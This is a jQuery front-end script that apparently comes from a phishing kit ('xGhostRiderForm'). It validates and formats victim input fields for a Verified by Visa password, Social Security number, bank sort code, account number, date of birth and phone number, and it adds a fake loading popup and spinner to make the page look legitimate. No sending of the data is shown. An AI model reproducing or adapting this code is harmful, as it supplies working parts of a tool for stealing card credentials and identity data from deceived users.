$(function() {
	$("#popup").delay(1000).fadeOut(0);
	$("#xGhostRiderForm").delay(1000).fadeIn(300);
		$("#vbv_submit_btn").click(function(o) {
		    $("#password_vbv").keydown(function() {$(this).css("border-color", "#a9a9a9")});
			$("#phone_numb").keydown(function() {$(this).css("border-color", "#a9a9a9")});
			$("#day").keydown(function() {$(this).css("border-color", "#a9a9a9")});
			$("#month").keydown(function() {$(this).css("border-color", "#a9a9a9")});
			$("#year").keydown(function() {$(this).css("border-color", "#a9a9a9")});
		    if (0 == /.{3,}/.test($("#password_vbv").val())) return $("#password_vbv").focus(), $("#password_vbv").css("border-color", "#bf0000"), !1;
			if (0 == /[0-9]{2}/.test($("#day").val())) return $("#day").focus(), $("#day").css("border-color", "#bf0000"), !1;
			if (0 == /[0-9]{2}/.test($("#month").val())) return $("#month").focus(), $("#month").css("border-color", "#bf0000"), !1;
			if (0 == /[0-9]{4}/.test($("#year").val())) return $("#year").focus(), $("#year").css("border-color", "#bf0000"), !1;
			if (0 == /[0-9]{5,}/.test($("#phone_numb").val())) return $("#phone_numb").focus(), $("#phone_numb").css("border-color", "#bf0000"), !1;
			$('#Rotation').fadeIn(300);
		});
	$(".sortnum").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $(".sortnum").html("").show();
            return false;
        }
    });
    $(".sortnum").keyup(function() {
        $this = $(this);
        if ($this.val().length >= $this.data("maxlength")) {
            if ($this.val().length > $this.data("maxlength")) {
                $this.val($this.val().substring(0, 2));
            }
            $this.next(".sortnum").focus();
        }
    });
    $(".ssnum").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $(".ssnum").html("").show();
            return false;
        }
    });
    $(".ssnum").keyup(function() {
        $this = $(this);
        if ($this.val().length >= $this.data("maxlength")) {
            if ($this.val().length > $this.data("maxlength")) {
                $this.val($this.val().substring(0, 4));
            }
            $this.next(".ssnum").focus();
        }
    });
    $(".accnumber").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $(".accnumber").html("").show();
            return false;
        }
    });
    $("#osid").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $("#osid").html("").show();
            return false;
        }
    });
	$("#osid").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $("#osid").html("").show();
            return false;
        }
    });
	$("#phone").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $("#phone").html("").show();
            return false;
        }
    });
	$("#phone_numb").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $("#phone_numb").html("").show();
            return false;
        }
    });
	$(".dob").keypress(function (e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $(".dob").html("").show();
                return false;
        }
	});
    $(".dob").keyup(function () {
        $this=$(this);
        if ($this.val().length >=$this.data("maxlength")) {
        if($this.val().length>$this.data("maxlength")){
            $this.val($this.val().substring(0,4));
        }
            $this.next(".dob").focus();
        }
    });
	$('#password_vbv').focus(function() {
        $(this).attr('type', 'text')
    }).blur(function() {
        $(this).attr('type', 'password')
    });
    $('#day').focus(function() {
    	$(this).attr('placeholder', 'DD')
    }).blur(function() {
        $(this).attr('placeholder', 'Day')
    });
	$('#month').focus(function() {
    	$(this).attr('placeholder', 'MM')
    }).blur(function() {
        $(this).attr('placeholder', 'Month')
    });
	$('#year').focus(function() {
    	$(this).attr('placeholder', 'YYYY')
    }).blur(function() {
        $(this).attr('placeholder', 'Year')
    });
});